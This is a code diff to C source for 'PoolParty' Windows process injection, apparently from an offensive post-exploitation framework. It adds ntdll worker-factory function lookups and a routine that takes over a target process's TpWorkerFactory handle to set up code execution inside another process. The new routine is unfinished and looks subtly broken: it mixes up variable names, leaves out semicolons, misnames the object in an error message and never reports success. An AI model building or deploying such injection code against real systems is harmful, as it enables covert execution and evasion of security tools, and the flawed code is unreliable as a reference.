@@ -38,6 +38,18 @@ pNtDll* GetOrInitNtDll() {
 			}
 			dprintf("[INJECT][inject_via_poolparty][ntdll_init] ZwSetIoCompletion: %p", ntdll->pZwSetIoCompletion);
 
+
+			ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
+			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtQueryInformationWorkerFactory: %p", ntdll->pNtQueryInformationWorkerFactory);
+
+			ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
+			dprintf("[INJECT][inject_via_poolparty][ntdll_init] NtSetInformationWorkerFactory: %p", ntdll->pNtSetInformationWorkerFactory);
+
+			if (ntdll->pNtQueryInformationWorkerFactory != NULL && ntdll->pNtSetInformationWorkerFactory != NULL) {
+				bSupportedTechnique[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE] = TRUE;
+			}
+
+
 			//ntdll->pZwSetInformationFile = (NTSTATUS(NTAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, ULONG))GetProcAddress(hNtDll, "ZwSetInformationFile"); // WIN7
 			//ntdll->pNtAlpcCreatePort = (NTSTATUS(NTAPI*)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES))GetProcAddress(hNtDll, "NtAlpcCreatePort"); // WIN7
 			//ntdll->pNtAlpcSetInformation = (NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG))GetProcAddress(hNtDll, "NtAlpcSetInformation"); // WIN7
@@ -46,8 +58,6 @@ pNtDll* GetOrInitNtDll() {
 			//ntdll->pNtSetTimer2 = (NTSTATUS(NTAPI*)(HANDLE, PLARGE_INTEGER, PLARGE_INTEGER, PT2_SET_PARAMETERS))GetProcAddress(hNtDll, "NtSetTimer2"); // WIN 10(?)
 			//ntdll->pNtTpAllocAlpcCompletion = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocAlpcCompletion"); // WIN7
 			//ntdll->pTpAllocJobNotification = (NTSTATUS(NTAPI*)(PVOID, HANDLE, PVOID, PVOID, PVOID))GetProcAddress(hNtDll, "TpAllocJobNotification"); // WIN 10
-			//ntdll->pNtQueryInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtDll, "NtQueryInformationWorkerFactory"); // WIN 7
-			//ntdll->pNtSetInformationWorkerFactory = (NTSTATUS(NTAPI*)(HANDLE, _WORKERFACTORYINFOCLASS, PVOID, ULONG))GetProcAddress(hNtDll, "NtSetInformationWorkerFactory"); // WIN7
 		}
 	}
 	return ntdll;
@@ -63,7 +73,7 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	PPROCESS_HANDLE_SNAPSHOT_INFORMATION lpProcessInfo = NULL;
 	PPUBLIC_OBJECT_TYPE_INFORMATION lpObjectInfo = NULL;
 	pNtDll* ntDll = GetOrInitNtDll();
-	
+
 	DWORD ntStatus = 0;
 	lpProcessInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpProcessInfo: %p", lpProcessInfo);
@@ -195,3 +205,36 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 	return dwResult;
 }
 
+DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTrigger) {
+	BOOL bError = FALSE;
+	HANDLE hHijackHandle = INVALID_HANDLE_VALUE;
+	ULONG dwInformationSizeIn = 1;
+	ULONG dwInformationSizeOut = 0;
+	pNtDll* ntDll = NULL;
+	DWORD dwResult = ERROR_POOLPARTY_GENERIC;
+	HANDLE hHeap = GetProcessHeap();
+	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
+	do {
+		ntDll = GetOrInitNtDll();
+		if (ntdll == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Cannot GetOrInitNtDll()", ERROR_POOLPARTY_GENERIC);
+		}
+		if (!bSupportedTechnique[POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE]) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] This variant is not supported in this system.", ERROR_POOLPARTY_VARIANT_FAILED)
+		}
+		hHijackHandle = GetRemoteHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
+
+		if (hHijackHandle == INVALID_HANDLE_VALUE) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] Unable to locate IoCompletion object inside the target process.", ERROR_POOLPARTY_VARIANT_FAILED)
+		}
+
+		if (hHijackHandle != INVALID_HANDLE_VALUE) {
+			ntdll->pNtQueryInformationWorkerFactory(hHijackHandle, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
+
+			ULONG WorkerFactoryMinimumThreadNumber = WorkerFactoryInformation.TotalWorkerCount + 1;
+			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WorkerFactoryInformation.StartRoutine: %ull", WorkerFactoryInformation.StartRoutine);
+			ntdll->pNtSetInformationWorkerFactory(hHijackHandle, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
+		}
+	} while (0);
+	return dwResult;
+}
